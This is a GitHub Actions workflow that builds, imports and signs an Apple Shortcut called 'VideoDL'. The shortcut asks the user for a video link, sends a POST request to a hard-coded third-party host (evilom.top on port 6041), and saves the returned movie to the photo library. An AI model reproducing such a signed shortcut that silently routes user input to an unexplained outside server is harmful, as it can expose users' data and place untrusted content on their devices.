name: Sign VideoDL Shortcut

on:
  workflow_dispatch:
  push:
    branches: [main]

jobs:
  sign:
    runs-on: macos-latest
    steps:
      - uses: actions/checkout@v4

      - name: Create plist (XML)
        run: |
          /usr/bin/plutil -convert xml1 -r - << 'PLIST' > VideoDL.plist
          <?xml version="1.0" encoding="UTF-8"?>
          <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
          <plist version="1.0">
          <dict>
            <key>NSPersistentStoreTypeKey</key><string>Binary</string>
            <key>WFWorkflowMinimumVersion</key><string>1344</string>
            <key>WFWorkflowInputContentItemClasses</key>
            <array>
              <dict><key>Type</key><string>WFURLItem</string><key>WFSerializationType</key><string>WFItemTypeInput</string></dict>
            </array>
            <key>WFWorkflowOutputContentItemClasses</key>
            <array>
              <dict><key>Type</key><string>WFContentItem</string><key>WFSerializationType</key><string>WFItemTypeOutput</string></dict>
            </array>
            <key>WFWorkflowActions</key>
            <array>
              <dict>
                <key>WFWorkflowActionIdentifier</key><string>is.workflow.actions.ask</string>
                <key>WFWorkflowActionParameters</key>
                <dict>
                  <key>WFAskActionPrompt</key><string>📋 粘贴视频链接</string>
                  <key>WFActionStatus</key>
                  <dict><key>StatusType</key><string>NotStarted</string><key>UUID</key><string>84D0BE13-5825-409E-8AF1-411F965E75DB</string></dict>
                  <key>WFDictionaryFieldValueItems</key>
                  <array>
                    <dict>
                      <key>WFItemType</key><integer>0</integer>
                      <key>WFKey</key><dict><key>Value</key><dict><key>string</key><string>WFAskActionPrompt</string></dict><key>WFSerializationType</key><string>WFTextTokenString</string></dict>
                      <key>WFValue</key><dict><key>Value</key><dict><key>string</key><string>📋 粘贴视频链接</string></dict><key>WFSerializationType</key><string>WFTextTokenString</string></dict>
                    </dict>
                  </array>
                  <key>WFSerializationType</key><string>WFDictionaryFieldValue</string>
                </dict>
              </dict>
              <dict>
                <key>WFWorkflowActionIdentifier</key><string>is.workflow.actions.geturlcontents</string>
                <key>WFWorkflowActionParameters</key>
                <dict>
                  <key>WFActionStatus</key>
                  <dict><key>StatusType</key><string>NotStarted</string><key>UUID</key><string>5D2FD37E-0BF8-4EFE-9C9B-C9D9A5804225</string></dict>
                  <key>WFDictionaryFieldValueItems</key>
                  <array>
                    <dict>
                      <key>WFItemType</key><integer>0</integer>
                      <key>WFKey</key><dict><key>Value</key><dict><key>string</key><string>WFURLActionURL</string></dict><key>WFSerializationType</key><string>WFTextTokenString</string></dict>
                      <key>WFValue</key><dict><key>Value</key><dict><key>string</key><string>http://evilom.top:6041/download</string></dict><key>WFSerializationType</key><string>WFTextTokenString</string></dict>
                    </dict>
                    <dict>
                      <key>WFItemType</key><integer>0</integer>
                      <key>WFKey</key><dict><key>Value</key><dict><key>string</key><string>WFHTTPMethod</string></dict><key>WFSerializationType</key><string>WFTextTokenString</string></dict>
                      <key>WFValue</key><dict><key>Value</key><dict><key>string</key><string>POST</string></dict><key>WFSerializationType</key><string>WFTextTokenString</string></dict>
                    </dict>
                    <dict>
                      <key>WFItemType</key><integer>0</integer>
                      <key>WFKey</key><dict><key>Value</key><dict><key>string</key><string>WFAcceptableTypes</string></dict><key>WFSerializationType</key><string>WFTextTokenString</string></dict>
                      <key>WFValue</key><dict><key>Value</key><dict><key>string</key><string>public.movie</string></dict><key>WFSerializationType</key><string>WFTextTokenString</string></dict>
                    </dict>
                  </array>
                  <key>WFSerializationType</key><string>WFDictionaryFieldValue</string>
                </dict>
              </dict>
              <dict>
                <key>WFWorkflowActionIdentifier</key><string>is.workflow.actions.savephoto</string>
                <key>WFWorkflowActionParameters</key>
                <dict>
                  <key>WFActionStatus</key>
                  <dict><key>StatusType</key><string>NotStarted</string><key>UUID</key><string>2148EE49-34D8-4399-B9AA-D9B82BE49050</string></dict>
                  <key>WFDictionaryFieldValueItems</key><array/>
                  <key>WFSerializationType</key><string>WFDictionaryFieldValue</string>
                </dict>
              </dict>
            </array>
            <key>WFWorkflowIcon</key>
            <dict>
              <key>WFDictionaryFieldValueItems</key><array/>
              <key>WFSerializationType</key><string>WFDictionaryFieldValue</string>
            </dict>
            <key>WFWorkflowName</key><string>VideoDL</string>
          </dict>
          </plist>
          PLIST
          echo "plist created"
          /usr/bin/plutil -lint VideoDL.plist && echo "lint OK"

      - name: Try shortcuts import
        run: |
          echo "=== shortcuts CLI version ==="
          shortcuts --version 2>&1 || true
          shortcuts list 2>&1 || true
          echo ""
          echo "=== Try import ==="
          shortcuts import ./VideoDL.plist 2>&1 || echo "import failed"
          shortcuts list | grep -i video || echo "not found"

      - name: Try shortcuts sign
        run: |
          echo "=== Try sign ==="
          shortcuts sign --input ./VideoDL.plist --output ./VideoDL.signed.shortcut 2>&1
          ls -la *.shortcut 2>/dev/null || echo "no signed file"

      - name: Upload artifact
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: videodl-shortcut
          path: VideoDL.signed.shortcut
          retention-days: 30
